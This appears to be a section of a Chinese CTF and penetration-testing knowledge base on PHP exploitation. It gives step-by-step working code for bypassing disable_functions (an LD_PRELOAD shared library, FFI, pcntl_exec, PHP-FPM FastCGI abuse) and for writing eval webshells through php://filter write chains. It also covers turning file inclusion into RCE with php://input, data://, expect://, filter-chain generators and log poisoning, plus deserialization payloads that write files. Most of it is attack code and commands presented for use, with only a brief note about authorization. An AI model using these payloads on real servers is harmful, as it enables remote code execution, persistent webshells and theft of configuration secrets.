## [g-php-bypass] 绕过与进阶——disable_functions、过滤器、伪协议组合
### [php-disable-functions] disable_functions 绕过 | hard | PHP;disable_functions;RCE | LD_PRELOAD;FFI
> 禁了 system/eval 之后怎么继续执行：四条主流路线

#### 这个条目的作用
你已经拿到一个能执行 PHP 代码的 webshell（比如蚁剑连接成功、或者有 `eval($_POST[1])` 这类一句话），但敲 `system("id")` 报错——`disable_functions` 把命令执行/代码执行函数全禁了。本条目教你在名单之内继续执行命令的四条主流路线：**LD_PRELOAD + mail/error_log**、**FFI 调 C 库**、**pcntl_exec**、**打 PHP-FPM 未授权**，外加一条写马路线（iconv 过滤器）。核心思想：禁用列表只拦 PHP 函数，拦不住"PHP 之外的机制"——子进程、C 库、FastCGI 协议。

> [!warn]
> 全程需要确定两件事：一、当前用户对 /tmp 等目录可写（能传文件）；二、靶场是 Linux 环境且装了对应扩展（FFI 要 PHP≥7.4、pcntl 要装了 pcntl 扩展）。Windows 靶场的 disable_functions 绕过走另一套（见 waf-bypass 相关条目），这里不展开。

#### 前置条件
- 已有一个能执行任意 PHP 代码的 webshell（蚁剑或 `eval($_POST[1])`）
- 能通过 webshell 上传文件（或者靶场自带文件上传点）
- 能读到 phpinfo / 报错信息来确认 `disable_functions` 名单和扩展列表

#### 第 1 步：确认禁用名单，决定走哪条路
先在蚁剑终端跑 `phpinfo();`，或者直接看 `disable_functions` 的 ini 值：

```php
<?php
// 没被禁的话会打印名单字符串
print(ini_get('disable_functions'));
// 看哪些扩展还活着
print(PHP_VERSION . "\n");
var_dump(extension_loaded('ffi'), extension_loaded('pcntl'), extension_loaded('iconv'));
```

预期结果：拿到一串逗号分隔的函数名（比如 `system,exec,passthru,shell_exec,popen,proc_open`），并确认 PHP 版本与扩展情况。
如果不行：phpinfo 也被禁了就访问 `?phpinfo=1` 或找报错页，最常见的情况是 `phpinfo` 本身没被禁（它常被刻意保留好让你看名单）。

决策表：
| 名单/环境情况 | 首选路线 |
|---|---|
| `mail`、`error_log` 可用，能上传 .so | LD_PRELOAD 路线 |
| PHP ≥ 7.4 且 `ffi` 扩展已加载 | FFI 路线 |
| `pcntl` 扩展存在且未被禁 | pcntl_exec 路线 |
| 目标 9000 端口（或 unix socket）暴露 PHP-FPM | FPM 未授权路线（绕全家） |

#### 第 2 步：LD_PRELOAD + mail 触发子进程（最经典路线）
原理：`mail()` 内部会用 `popen` 调用系统的 `sendmail` 程序，拉起一个**新进程**；新进程启动时动态链接器会按 `LD_PRELOAD` 环境变量先加载你的 .so。在 .so 的构造函数里执行命令，命令就绕过了 `disable_functions`。

先在本机（同架构的 Linux）编译恶意 .so：

```bash
# bypass.c
gcc -shared -fPIC -o bypass.so bypass.c
```

```c
#include <stdlib.h>
#include <unistd.h>
__attribute__((constructor)) void bypass() {
    unsetenv("LD_PRELOAD");          // 防止递归加载
    system("id > /tmp/out.txt");     // 执行你要的命令，写文件拿回显
}
```

把 `bypass.so` 上传到靶机（如 `/tmp/bypass.so`），然后用 webshell 执行：

```php
<?php
putenv("LD_PRELOAD=/tmp/bypass.so");
mail("a@b.c", "", "", "");              // 触发子进程
echo file_get_contents("/tmp/out.txt"); // 读出 id 结果
```

预期结果：打印出 `uid=33(www-data) gid=33(www-data) ...`。
如果不行：靶机没有 sendmail 或 `mail` 被禁用 → 换 `error_log` 触发（同样走 sendmail），或换第 3 步的 FFI 路线：

```php
<?php
putenv("LD_PRELOAD=/tmp/bypass.so");
error_log("", 1, "a@b.c");              // message_type=1 表示发邮件
echo file_get_contents("/tmp/out.txt");
```

#### 第 3 步：FFI 直接调 libc 的 system（PHP ≥ 7.4 且开了 FFI）
FFI 允许 PHP 直接声明并调用 C 库函数，`system` 是 libc 的函数，完全绕开 PHP 层面的禁用：

```php
<?php
$ffi = FFI::cdef("int system(const char *command);", "libc.so.6");
$ffi->system("id > /tmp/out.txt");
echo file_get_contents("/tmp/out.txt");
```

预期结果：同第 2 步，能执行命令。
如果不行：报 `FFI 扩展未启用` → 说明 `extension=ffi` 没开或 `ffi.enable` 被关，换路线；报 `Undefined constant FFI` 则 PHP 低于 7.4。

#### 第 4 步：pcntl_exec 路线
`pcntl` 扩展的函数经常不在禁用名单里（运维常忘了禁）。注意 `pcntl_exec` **没有回显**且会替换当前进程，所以要把输出重定向到文件再读：

```php
<?php
pcntl_exec("/bin/sh", ["-c", "id > /tmp/out.txt; cat /tmp/out.txt > /dev/null"]);
// 进程已被替换，用下面方法兜底读结果：
sleep(1);
echo file_get_contents("/tmp/out.txt");
```

> [!warn]
> `pcntl_exec` 成功后当前 PHP 进程直接变成 `/bin/sh`，后续 PHP 代码不会再执行——所以把 `echo` 放前面或靠文件读取。更稳的姿势是在命令里把结果写文件，另起一个请求读文件。

预期结果：`/tmp/out.txt` 里有命令输出。
如果不行：报 `Call to undefined function pcntl_exec` → pcntl 没装，换 FPM 路线。

#### 第 5 步：iconv 过滤器写马（配合文件写入点）
如果目标给了 `file_put_contents` / 文件上传写入点，但写入内容被过滤了 `<`、`?` 等字符，用 `php://filter/write=` 在**写入瞬间**做编码转换还原。把 payload 手工转成 UTF-7（`<` 变 `+ADw-`、`>` 变 `+AD4-`）传过去，落盘时再转回 UTF-8：

```php
<?php
// "+ADw-?php ... ?+AD4-" 就是 <?php ... ?> 的 UTF-7 形式，字符串里不含 < 和 >>
$payload = "+ADw-?php @eval(\$_POST['x']);?+AD4-";
file_put_contents("php://filter/write=convert.iconv.UTF-7.UTF-8/resource=/tmp/shell.php", $payload);
// 之后直接包含执行：include("/tmp/shell.php"); 或访问 webshell 连接
```

预期结果：`/tmp/shell.php` 落盘后内容是正常的 `<?php @eval($_POST['x']);?>`。
如果不行：`convert.iconv` 过滤器在极老版本（PHP<5.4）不一定可用；备选是 `write=convert.base64-decode`，把 webshell 的 base64 串写进去（base64 串同样不含 `<`）。

#### 第 6 步：PHP-FPM 未授权（终极大招，绕 disable_functions 全家）
如果目标 PHP 跑在 FPM 且 9000 端口（或 unix socket）对本站可访问，直接以 FastCGI 协议发请求，根本不用 PHP 函数：

```bash
# 用现成工具 fpm.py（网上大量流传）或蚁剑插件"FPM 未授权"
python3 fpm.py -c "<?php system('id');?>" -p 9000 127.0.0.1 /var/www/html/index.php
```

工具内部做的事是：构造 FastCGI 请求，设置环境变量 `PHP_VALUE: auto_prepend_file=php://input`（让每个 PHP 请求先包含你的代码），`SCRIPT_FILENAME` 指向任何存在的 PHP 文件，body 放 `<?php system('id');?>`。
预期结果：命令执行（FPM 子进程以 php-fpm 用户运行，往往比 webshell 用户权限还高）。
如果不行：9000 不通 → 试 unix socket（php-fpm.sock）路径；报 `Access denied` → 目标 FPM 配了 `listen.allowed_clients` 限制，只能打本机入口（配合 SSRF 或本机 webshell 内发请求）。

#### 常见错误与排查
| 现象 | 原因 | 解决 |
|---|---|---|
| LD_PRELOAD 不生效，out.txt 不存在 | sendmail 不存在或 `mail`/`error_log` 被禁 | 换 error_log 触发；还不行就换 FFI / pcntl / FPM 路线 |
| `.so` 上传后执行报段错误 | 架构不匹配（x86 vs x64）或 glibc 版本差异 | 用目标同架构编译，或先用 `uname -m` 确认架构 |
| FFI 报 `Call to undefined function FFI::cdef` | PHP < 7.4 或 ffi 扩展未启用 | 换 LD_PRELOAD / FPM 路线 |
| pcntl_exec 后一片空白 | 进程已被替换，echo 没机会执行 | 命令输出重定向到文件，另一端读文件 |
| FPM 打不通 | 端口/socket 路径不对或 allowed_clients 限制 | 先用 `netstat -tlnp` 找监听地址，试 unix socket |

#### 实战要点
- **先看名单再选路线**：每个靶场禁的函数集不同，蚁剑终端里先 `ini_get('disable_functions')`，别盲打。
- 蚁剑插件市场有现成的 bypass 插件（LD_PRELOAD 一键打），优先用，能省掉手动编译。
- `.so` 编译要"目标架构"匹配，CTF 里常见解法是靶场有 gcc 就直接在靶机上编译。
- 任何"无回显"的执行都先把结果写文件再读，这是绕过场景的通用套路。
- FPM 未授权是通用性最强的：不依赖任何扩展，且能绕掉几乎全部 disable_functions，遇到 FPM 场景优先试。

### [php-filter-chains] php://filter 高级读法 | medium | PHP;过滤器;LFI | filter链;convert.base64
> 多过滤器链：组合编码绕过滤、读二进制、读带特殊字符文件

#### 这个条目的作用
有 LFI（`include($file)` / `file_get_contents($file)` 且 `$file` 可控）时，单个 `convert.base64-encode` 只是入门。当页面过滤了输出里的标记、过滤了 `base64` 关键字、或者要读的文件内容有特殊字符/是二进制时，需要把多个过滤器串成**链**（filter chain）达到目的。本条目覆盖：基础 base64 读法、rot13/UTF-7 读法、链式串联语法、iconv 长链（生成器）、以及 `write=` 写马链。

> [!tip]
> `php://filter` 不需要 `allow_url_include=On`，即使 `allow_url_fopen` 关闭也能用——这正是它在 LFI 题里地位最高的原因。先记住这一点。

#### 前置条件
- 一个 `include`/`file_get_contents` 的路径参数完全可控的 LFI 点
- 理解 `php://filter/<filter>/resource=<路径>` 的基本格式

#### 第 1 步：基础 base64 读法（先确保能看到源码）
最稳的第一发，永远先打这个：

```txt
?file=php://filter/convert.base64-encode/resource=flag.php
```

预期结果：页面返回一段 base64（`PD9waHA...`），解码得到 `flag.php` 源码。
原理：base64 后的内容是纯字母数字，**不含 `<?php`**，即使经过 include 也不会执行，只会原样输出。
如果不行：返回空或报错 → 路径相对于当前工作目录，试试 `resource=/var/www/html/flag.php` 或相对路径；这个是 LFI 基本盘，此路不通说明过滤的是别的东西，往下看。

#### 第 2 步：base64 被过滤时用 rot13 / UTF-7 读原文
如果目标过滤了字符串 `base64`（比如把 `convert.base64-encode` 吞掉），改用**不会触发关键词**的编码：

```txt
# rot13：内容变成 rot13 编码显示，手工 rot13 解码即可
?file=php://filter/string.rot13/resource=flag.php

# UTF-7：< 会变成 +ADw-，> 变成 +AD4-，内容不再被当 PHP 解析
?file=php://filter/convert.iconv.UTF-8.UTF-7/resource=flag.php
```

预期结果：rot13 下看到 `<?puc`（即 `<?php` 的 rot13），UTF-7 下看到 `+ADw-?php`——都是"能还原的变形"，文件本身没被 PHP 解析执行。
如果不行：过滤的是"过滤器名"而不是编码产物（连 `convert` 都拦）→ 走第 3 步的链式组合或换其它编码对。

#### 第 3 步：链式串联语法（read= 与 | 分隔）
多个过滤器用 `|`（或 `/`）串起来，**从左到右依次应用**。`read=` 前缀显式声明这是读链，语法为：

```txt
?file=php://filter/read=convert.base64-encode|convert.iconv.UTF-8.UTF-7/resource=flag.php
?file=php://filter/convert.base64-encode/convert.iconv.UTF-8.UTF-7/resource=flag.php
```

预期结果：两种写法都按"先 base64 再 UTF-7"（或相反）处理内容。注意顺序不同结果不同，链条是从前往后逐个套的。
如果不行：某些版本的 `read=` 前缀和裸过滤器混用会解析异常，保持统一格式再试。

#### 第 4 步：iconv 长链（把任意文件内容变成可执行 PHP——终极姿势）
原理（2023 年 Synacktiv 公开的 PHFilterchains 研究）：**任意一个字节**经过精心挑选的 `convert.iconv.xxx.yyy` 转换序列，可以变成你想要的任何 ASCII 字符。于是给 LFI 拼一条几百个过滤器的长链，读任意一个可知内容的文件（甚至 `/etc/passwd`），输出被转换成 `<?php system('id');?>` 等**可执行的 PHP 代码**——直接 LFI 变 RCE，还不用管靶场对输入字符的过滤。

**不要手写长链**，用现成生成器（GitHub 搜 `php_filter_chain_generator`，如 ambionics 项目），给定文件内容与目标 payload，它输出整条链：

```bash
python3 php_filter_chain_generator.py --chain '<?php system("id");?>'
# 输出形如：php://filter/convert.iconv.UTF8.CSISO2022KR|convert.base64-encode|.../resource=需要的内容
```

然后把生成的链拼到 LFI 参数上：

```txt
?file=php://filter/<生成的长链>/resource=/etc/passwd
?file=php://filter/<生成的长链>/resource=/var/www/html/flag.php
```

预期结果：任选一个可读文件作为"原料"，页面直接打印出 `uid=33(...)` 之类的命令输出（payload 被 filter 链合成出来并执行）。
如果不行：生成器要求"原料文件内容可预测且长度足够"，`resource=` 指向的文件不能是空的；换个文件当原料再试。

#### 第 5 步：write= 写马链（配合 file_put_contents 拿 shell）
过滤器不止能读，还能挂在写入端。目标有 `file_put_contents($f, $c)` 且 `$c` 可控但被过滤了 `<`/`?` 等字符时：

```php
<?php
// 1) base64 写法：字符串里没有 < 和 ?
$c = base64_encode('<?php @eval($_POST["x"]);?>');
file_put_contents("php://filter/write=convert.base64-decode/resource=/tmp/shell.php", $c);

// 2) iconv UTF-7 写法：payload 用 UTF-7 形式（不含 < >）
$c2 = "+ADw-?php @eval(\$_POST['x']);?+AD4-";
file_put_contents("php://filter/write=convert.iconv.UTF-7.UTF-8/resource=/tmp/shell.php", $c2);
```

预期结果：`/tmp/shell.php` 落盘后是合法的 `<?php ... ?>`，直接 include 或访问即可连接。
如果不行：`write=` 过滤器要求 PHP 版本支持；且要注意 base64-decode 会忽略非法字符，payload 长度不足 4 的倍数会多出垃圾字节，末尾可补 `==`。

#### 常见错误与排查
| 现象 | 原因 | 解决 |
|---|---|---|
| base64 内容仍然被过滤 | 过滤了 `base64`/`convert` 关键字 | 换 rot13 / UTF-7，或 iconv 长链 |
| 读出来的内容被当 PHP 执行（一片空白） | 过滤器没生效，读的是原文件 | 检查 `read=`/`resource=` 拼写与顺序，先在本地 php -r 验证链 |
| iconv 链报 `Detected an illegal character` | 转换对遇到非法字节 | 换编码对，或改在目标文件里选含可打印字符的内容做原料 |
| dechunk 过滤器加进去就报错 | `dechunk` 只处理 chunked 格式数据，普通文件会解析失败 | 只在内容确实是 chunked 编码时才用（常见于组合链的收尾） |
| 长链生成器的 payload 打不出来 | 原料文件为空/内容不可预测 | 换长一点的已知文件（如 /etc/passwd）当 resource |

#### 实战要点
- **第一发永远是 `convert.base64-encode`**，简单直接，只在它失效时才升级到链。
- 链的顺序决定结果：过滤器从左到右套，改顺序等于换一种编码，测试时先本地验证再打靶。
- `php://filter` 读文件不需要任何 `allow_url_*` 配置，别因为 include 报错就放弃这条线。
- 长链用生成器，短链手写：`read=string.rot13`、`read=convert.iconv.UTF-8.UTF-7` 这两个单过滤器覆盖 90% 的"关键词过滤"题目。
- `write=` 链的价值在于"内容过滤"而不是"函数禁用"，遇到文件写入点被过滤时优先想起它。

### [php-wrappers-adv] 伪协议实战组合 | medium | PHP;伪协议;包含 | php://input;data://
> 从包含点到 RCE：input/data/expect + filter 的完整衔接

#### 这个条目的作用
`include($x)` 或 `require($x)` 的参数可控，这就是"包含点"。伪协议（wrapper）把这个点变成：直接执行代码（`php://input`、`data://`）、执行系统命令（`expect://`）、触发反序列化（`phar://`）、读任意文件（`php://filter`）。本条目按"环境能开几扇门"排序讲清楚各协议的触发条件与衔接逻辑，教你从包含点一路打到 RCE。

> [!warn]
> `php://input` 和 `data://` 在 include 场景都要求 `allow_url_include=On`（默认 Off，但绝大多数靶场会开；`expect://` 还额外要求安装 expect 扩展）。只有 `php://filter` 和 `phar://` 不需要任何开关——所以环境不支持时优先用它们。

#### 前置条件
- 一个 `include`/`require`/`include_once` 参数，且参数完全可控（无拼接前后缀或可绕过后缀）
- 能发起 POST 请求（php://input 路线需要）

#### 第 1 步：环境自查（30 秒决定打法）
先看 `allow_url_include`、`allow_url_fopen` 和 PHP 版本，决定哪条路能走：

```php
<?php
var_dump(ini_get('allow_url_include'), ini_get('allow_url_fopen'));
var_dump(extension_loaded('expect'));
var_dump(PHP_VERSION);
```

预期结果：拿到配置。`allow_url_include=1` 走 input/data；`expect` 扩展存在走 expect；全关就只剩 filter 读码和日志包含。
如果不行：phpinfo 看不了就分别试各协议，报错信息会告诉你是不是被 allow_url_include 拦的（报 `failed to open stream` + 提到 wrapper 名）。

#### 第 2 步：php://input——把请求体直接当 PHP 执行（最高频）
```txt
GET /?file=php://input HTTP/1.1
Host: target
Content-Type: application/x-www-form-urlencoded

<?php system($_GET['c']);?>
```
然后同时传 `&c=id`（`?file=php://input&c=id`）触发：
```txt
?file=php://input&c=id
```
预期结果：页面打印 `uid=33(www-data)...`。
原理：`php://input` 返回原始请求体，include 它等价于 include 你 POST 的代码。
如果不行：报错疑似 allow_url_include 关闭 → 换第 5 步 filter 读码或日志包含路线。

#### 第 3 步：data://——GET 里直接内联携带代码
```txt
# 方式一：明文（注意 + 号与空格要 URL 编码）
?file=data://text/plain,<?php system('id');?>

# 方式二：base64（推荐，不用管特殊字符）
?file=data://text/plain;base64,PD9waHAgc3lzdGVtKCdpZCcpOz8+
```
base64 内容对应 `<?php system('id');?>`。
预期结果：命令执行，页面输出 id。
如果不行：`allow_url_include` 或 `allow_url_fopen` 关了 → 换 filter；GET 传 base64 时串里的 `+`、`=`、`/` 被 URL 解析吞掉 → 先做 URL 编码（`%2B` 等）。

#### 第 4 步：expect://——扩展存在时的命令执行（少见但一锤定音）
```txt
?file=expect://id
?file=expect://whoami
```
预期结果：直接回显命令输出，连 POST 都不用。
如果不行：报 `Unable to find the wrapper "expect"` → 扩展没装，放弃这条线。

#### 第 5 步：filter 兜底与"读取-利用"衔接（allow_url_include 全关也有救）
无 input/data 时，至少还能用 filter 读源码，再找源码里的其它入口（数据库、写文件、二次包含）：

```txt
?file=php://filter/convert.base64-encode/resource=index.php
?file=php://filter/convert.base64-encode/resource=config.php
?file=php://filter/convert.base64-encode/resource=/var/log/apache2/access.log
```

预期结果：拿到关键源码，审计出真正的漏洞点（很多题：filter 读码 → 发现可写位置 → 写马 → RCE）。
如果不行：源码路径猜不到就用目录扫描/fuzz 常见文件（`.env`、`config.php`、`flag.php`、`index.php~` 备份）。

#### 第 6 步：日志包含兜底（最后一个非 wrapper 方案）
所有 wrapper 都不可用时，把 PHP 代码**写进日志**再 include 日志文件（日志里通常不执行 PHP，include 后才执行）：

```txt
# 1) User-Agent 头带代码发送（Nginx/Apache 日志会记录 UA）
User-Agent: <?php system($_GET['c']);?>

# 2) 再用 LFI 包含日志文件
?file=/var/log/nginx/access.log&c=id
```

预期结果：日志里的 `<?php ... ?>` 被 include 后执行，id 输出。
如果不行：日志路径不对（Apache 的 `/var/log/apache2/access.log`、`/var/log/httpd/access_log`）→ 逐个试；日志被清空/不可读 → 换 session 文件包含（`/tmp/sess_<你的PHPSESSID>`，先往 session 里塞代码）。

> [!danger]
> 日志包含后，日志会累积大量垃圾请求（巨长 UA）。这是制造痕迹的行为，靶场无妨；真实渗透中请先确认授权范围。

#### 常见错误与排查
| 现象 | 原因 | 解决 |
|---|---|---|
| `php://input` 不执行、当文本输出 | `allow_url_include=Off` | 换 filter 读源码 / 日志包含路线 |
| `data://` 报错或解码失败 | allow_url 关闭，或 base64 中 `+ = /` 被 URL 解析吃掉 | 修正配置判断；base64 串整体 URL 编码 |
| `expect://` 提示找不到 wrapper | 未安装 expect 扩展 | 换其它方案，expect 在 CTF 里本来就少见 |
| include 了文件但没现象 | 路径带后缀拼死（`$file.php`） | 用 `%00` 截断（PHP<5.3.4）或尝试 `php://filter` 绕过后缀拼接 |
| 日志包含无回显 | 日志记录格式不含 UA，或路径错 | 换 access.log 路径穷举；改用 session 文件包含 |

#### 实战要点
- **顺序记忆**：`php://input` 最常用但要 POST + allow_url_include；`data://` 次之（GET 一把梭）；`expect://` 看扩展；`php://filter` 永远能读码；`phar://` 触发反序列化（详见 php-phar-deser 条目）。
- 判断"能不能 include wrapper"最快的方式：看报错里有没有 `allow_url_include` 字样。
- php://input 配 `file_get_contents` 时读的是"原始请求体"，还能配合 JSON 场景读 body 数据，不只用于 include。
- 一个包含点不要只试一条路：先 filter 读源码看清环境（开没开 allow_url_include、有哪些目录），再决定打法，盲打三件套效率最低。

## [g-php-deser] 反序列化——格式、魔术方法、POP 链、phar 与 session
### [php-serialize-format] 序列化格式逐字节解析 | medium | PHP;反序列化;序列化 | serialize;类型标记
> serialize() 输出结构：类型标记与长度怎么数，手写 payload 的前提

#### 这个条目的作用
PHP 把对象/数组转成字符串（`serialize()`），`unserialize()` 再还原。这个字符串有严格的**类型标记 + 长度**语法，长度错一个字节就解析失败或属性丢失。CTF 里你常常没有 `serialize()` 的输出，要**纯手写**这个字符串作为 payload 喂给 `unserialize()`——所以必须逐字节理解它。本条目教你把类型标记表背下来、把长度数对，并给出本地验证方法。

#### 前置条件
- 知道目标代码里 `unserialize($_GET['data'])` 之类的反序列化入口
- 能跑本地 PHP（`php -r` 一行验证），有就足够

#### 第 1 步：背类型标记表
序列化串的最小单元是 `类型标记:值`，值后面跟分隔符。核心标记：

| 标记 | 含义 | 示例 |
|---|---|---|
| `N` | null | `N;` |
| `b` | 布尔 | `b:1;` / `b:0;` |
| `i` | 整数 | `i:42;` |
| `d` | 浮点 | `d:3.14;` |
| `s` | 字符串 | `s:5:"admin";` |
| `a` | 数组 | `a:2:{...}` |
| `O` | 对象（含类名与属性数） | `O:4:"User":1:{...}` |
| `C` | 自定义序列化（实现 Serializable 接口的类） | `C:7:"MyClass":5:{...}` |
| `r`/`R` | 递归/引用 | `r:1;`（指向第 1 个对象） |

预期结果：看到任何序列化串能第一时间说出"这块是字符串、这块是数组"。
如果不行：把这张表抄到笔记里，做题时对照着数。

#### 第 2 步：数长度的坑——按"字节"数，不是按字符数
`s:<长度>:"内容"` 里的长度是**UTF-8 字节数**：

```php
<?php
echo serialize("admin");   // s:5:"admin";
echo serialize("中国");    // s:6:"中国";  —— 两个汉字是 6 字节！
```

预期结果：想通"中文、emoji、`\0`（NUL）都要按字节数"。
如果不行：本地 `php -r 'echo strlen("中国");'` 输出 `6` 帮助确认；sanitize 时最容易数错的就是这类多字节字符。

#### 第 3 步：数组格式逐字节拆解
```txt
a:2:{i:0;s:3:"abc";i:1;s:2:"XY";}
```
拆解：`a:2:` ← 数组，2 个元素；`{}` 内是 `键值` 交替，键 `i:0;` 值 `s:3:"abc";`，再键 `i:1;` 值 `s:2:"XY";`。

预期结果：能手动在纸上画出一段数组串的键值对。
如果不行：字符串键也一样，`a:1:{s:4:"name";s:5:"admin";}` 即 `['name' => 'admin']`——键是 s 类型，值是 s 类型，别混。

#### 第 4 步：对象格式与可见性前缀（最容易错的地方）
```txt
O:4:"User":2:{s:4:"name";s:5:"admin";s:3:"age";i:24;}
```
即 `O:<类名长度>:"<类名>":<属性个数>:{<属性序列>}`。属性名**不是**裸写，必须带可见性前缀：

| 可见性 | 属性名实际形式 | 长度计算 | 例子（属性 name） |
|---|---|---|---|
| public | `name` | strlen(name) | `s:4:"name"` |
| protected | `\0*\0name` | 3 + strlen(name) | `s:7:"\0*\0name"` |
| private（类 A 声明） | `\0A\0name` | 2 + strlen(A) + strlen(name) | `s:10:"\0A\0name"` |

> [!warn]
> `\0` 是 NUL 字节（一个字节），长度必须把它算进去：`\0*\0name` 是 3+4=7。写在 payload 里时 `\0` 也必须真实存在——URL 传参可以用 `%00`，PHP 字符串里用 `"\0"` 拼，别写成本文字面量的 `\0` 两个字符。
> 另外 private 前缀里的类名是**声明该属性的类**，不是当前对象类——继承场景极易写错。

#### 第 5 步：手写最小 payload 并本地验证
目标代码（常见）：

```php
<?php
class User { public $name; }
$data = unserialize($_GET['data']);
echo $data->name;
```

payload（目标是让 `$data->name` 等于 `admin`）：
```txt
?data=O:4:"User":1:{s:4:"name";s:5:"admin";}
```
打之前永远先在本地跑一遍：
```bash
php -r 'class User{public $name;} var_dump(unserialize("O:4:\"User\":1:{s:4:\"name\";s:5:\"admin\";}"));'
```
预期结果：本地打印出 `object(User)#1 (1) { ["name"]=> string(5) "admin" }`，与预期一致再上传。
如果不行：本地报 `unserialize(): Error at offset ...`——报错的 offset 正好告诉你错在第几个字节，倒着数回去修；`class User` 没定义时先补上再测。

#### 常见错误与排查
| 现象 | 原因 | 解决 |
|---|---|---|
| `unserialize(): Error at offset N` | 长度/分隔符/引号错位 | 看 offset 定位到字节，重数长度 |
| 属性全是空值 | 可见性前缀少了 `\0`，属性名对不上 | private/protected 前缀重数（含 NUL） |
| 中文属性值错位 | 按字符数数了 | 按字节数（UTF-8 中文 3 字节） |
| 老式 `__wakeup` 绕过（属性数写大）不生效 | PHP ≥ 7.1 已修复该 trick | 别再用，换真实构造链 |
| 反序列化返回 `false` 不报错 | 整串结构非法 | 用 `var_dump` 包一层看返回值，或本地逐段拼接调试 |

#### 实战要点
- **本地 `php -r` 先验证再打靶**，这是唯一可靠的排错手段，序列化题目 90% 的失败是传输层转义/长度错误，本地能过再怀疑靶场。
- `s` 长度按字节；visible 前缀含 `\0`；private 类名用声明类——三条铁律。
- 数组可以嵌套对象：`a:1:{i:0;O:1:"A":0:{}}`，POP 链里数组套对象是常态。
- `C` 类型（Serializable 接口）走自定义 `unserialize()` 方法，链构造和 `O` 不同，看到 `C:` 先想想类有没有实现 Serializable。
- 手写困难时让本地 PHP 帮你生成：`php -r 'echo serialize(new User(...));'` 再逆向改属性值，比纯手写少一半错。

### [php-magic-methods] 魔术方法触发时机表 | easy | PHP;魔术方法;反序列化 | __wakeup;__destruct
> 哪个函数调用触发哪个魔术方法，POP 链的起点

#### 这个条目的作用
PHP 有一批以 `__` 开头的方法会被"特定动作"自动调用，叫魔术方法。反序列化攻击的本质就是：`unserialize()` 一触发 `__wakeup`，对象销毁时一触发 `__destruct`，链就动起来了。本条目把**哪个动作触发哪个魔术方法**整理成两张表（入口表 + 触发表），并给一个最小链示例——这是构造 POP 链（见 php-pop-chain）之前必须背熟的地基。

#### 前置条件
- 已理解序列化格式（php-serialize-format）
- 能读懂 PHP 类的定义

#### 第 1 步：记入口表——反序列化相关的方法
| 魔术方法 | 触发时机 | 反序列化相关 |
|---|---|---|
| `__wakeup()` | `unserialize()` 构建出对象后、属性赋值前 | ✅ 反序列化第一棒 |
| `__sleep()` | `serialize()` 时 | ✅ 序列化前一刻（返回要保留的属性名数组） |
| `__destruct()` | 对象被销毁（引用归零/unset/脚本结束） | ✅ 反序列化后的"收尾棒" |
| `__construct()` | `new` 实例化 | ❌ 反序列化**不**触发 |

预期结果：记住"`unserialize()` → 有 __wakeup 先触发；对象没了 → 有 __destruct 触发；`new` 才触发 __construct"。
如果不行：`__construct` 和 `__wakeup` 是最容易混的，做题时先圈出入口写法——看到 `unserialize` 想 wakeup/destruct，看到 `new` 才想 construct。

#### 第 2 步：记触发表——普通动作触发的方法（POP 链的中间件）
| 魔术方法 | 触发动作 | POP 链用途 |
|---|---|---|
| `__toString()` | 对象用在字符串上下文（echo、拼接、格式化） | 中间步：把属性拼进危险函数 |
| `__get()` | 读不可访问/不存在的属性 | 中间步：属性访问转发 |
| `__set()` | 写不可访问/不存在的属性 | 中间步 |
| `__isset()` / `__unset()` | `isset()`/`unset()` 不可访问属性 | 中间步 |
| `__call()` | 调用不存在的实例方法 | 中间步：方法调用转发 |
| `__callStatic()` | 调用不存在的静态方法 | 中间步 |
| `__invoke()` | 把对象当函数调用 `$obj()` | 中间步 |
| `__toString` 内的 `$this->x` | 属性本身不存在时再触发 `__get` | 链式串联点 |

预期结果：看到代码里出现"把对象当字符串拼"或"调用不存在方法"就能说出要触发哪个方法。
如果不行：这张表的记忆口诀——"字符串→toString、属性→get/set、方法→call、函数→invoke、销毁→destruct"。

#### 第 3 步：看一个最小链——__destruct 当起点
经典靶场模型：

```php
<?php
class A {
    public $file = "";                 // 可控属性
    function __destruct() {
        file_put_contents($this->file, '<?php phpinfo();?>');
    }
}
$data = unserialize($_GET['data']);    // 反序列化入口
```

payload（把 `$file` 指向可写路径）：
```txt
?data=O:1:"A":1:{s:4:"file";s:13:"/tmp/shell.php";}
```
流程：`unserialize` 创建 A 对象（无 __wakeup，跳过）→ 脚本结束/对象释放 → `__destruct` 自动跑 `file_put_contents('/tmp/shell.php', '<?php phpinfo();?>')` → 访问 `/tmp/shell.php` 验证。

预期结果：一次性 shell 落盘成功。
如果不行：`/tmp/shell.php` 没生成 → 用本地 `php -r` 跑一遍确认路径；属性名长度/前缀写错（本节第 4 步）→ 按序列化格式条目重新数。

#### 第 4 步：本地验证脚本（每个链都先这么验）
```bash
php -r 'class A{public $file="";function __destruct(){file_put_contents($this->file,"<?php echo 1;?>");}} unserialize("O:1:\"A\":1:{s:4:\"file\";s:13:\"/tmp/shell.php\";}");'
```
预期结果：运行完 `/tmp/shell.php` 出现且内容为 `<?php echo 1;?>`。
如果不行：注意 php -r 的引号转义——序列化串里的双引号在 shell 里要 `\"`；建议把测试脚本写成 `.php` 文件再用 `php test.php` 跑，少一半转义坑。

#### 第 5 步：两个高频坑——类没加载 & 版本修复
坑一：`unserialize()` 时类不存在（没有 autoload/类没被 include）→ 得到的是 `__PHP_Incomplete_Class`，**魔术方法全部不触发**：
```php
<?php
// 目标代码里类在另一个文件，入口处没 include
$data = unserialize($_GET['data']); // 类未加载时 __wakeup/__destruct 不执行！
```
预期结果：先确认目标代码是否在反序列化前加载了你用的类（`class_exists` / 代码审计）。
坑二：PHP ≥ 7.1 移除了老 trick——把对象属性数写大（`O:1:"A":2:{...}`，实际只有 1 个属性）来跳过 `__wakeup` 的旧绕过已失效，别再用（csgo 老题可以，新题全挂）。

#### 常见错误与排查
| 现象 | 原因 | 解决 |
|---|---|---|
| `__destruct` 没触发 | 对象没被销毁（代码提前 exit/对象仍在引用中） | 让脚本自然结束，或 `unset($obj)`；检查循环引用 |
| `__wakeup` 没触发 | 类未加载 → `__PHP_Incomplete_Class` | 确认反序列化前类已定义/autoload |
| `__toString` 报 `must return a string` | 方法返回了非字符串（PHP 8 直接 TypeError） | 让 `__toString` 内部 return 一个字符串 |
| 属性有值但链不生效 | 属性名长度/可见性前缀错，实际没赋上 | 重新按序列化格式数长度与 `\0` 前缀 |
| `__invoke` 触发不了 | 代码里没用函数调用方式使用对象 | 找到 `$obj(...)` 写法才能触发，换链点 |

#### 实战要点
- **`__destruct` 是比 `__wakeup` 更常用的 POP 链起点**：wakeup 只在入口出现一次，destruct 在脚本结束/对象释放时一定会跑，容错性高。
